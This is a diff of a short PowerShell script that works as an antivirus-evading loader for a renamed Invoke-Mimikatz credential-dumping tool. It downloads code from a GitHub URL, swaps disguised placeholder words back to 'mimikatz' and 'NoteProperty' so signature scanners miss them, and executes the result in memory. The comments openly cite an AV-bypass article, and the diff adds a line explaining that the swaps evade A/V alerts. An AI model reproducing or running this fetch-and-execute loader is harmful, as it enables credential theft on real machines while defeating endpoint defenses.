@@ -1,11 +1,15 @@
 # NO LOCAL SOURCE CODE NEEDED
 # ONLINE! MAKE SURE SOURCE CODE AS CLEAN AS POSSIBLE!
-# REF.(SECTION "TONY G"): https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/ 
+# REF.(SECTION "TONY G"): https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/
+# DOES NOT WORK IN WIN7/PS3
 # Invoke-CList
 
 $strSourceUrl = "https://raw.githubusercontent.com/abanakiya/CaseStudy_Invoke-Mimikatz/master/clist/clist.txt"
 $strCode = Invoke-RestMethod -Method Get -Uri $strSourceUrl
+
+# REPLACE *SOME WORDS THAT TRIGGER A/V ALERTS (
 $strCode = $strCode -replace "Nooote", "NoteProperty"
 $strCode = $strCode -replace "meemeemeow", "mimikatz"
 $strCode = [scriptblock]::Create($strCode)
+
 .$strCode
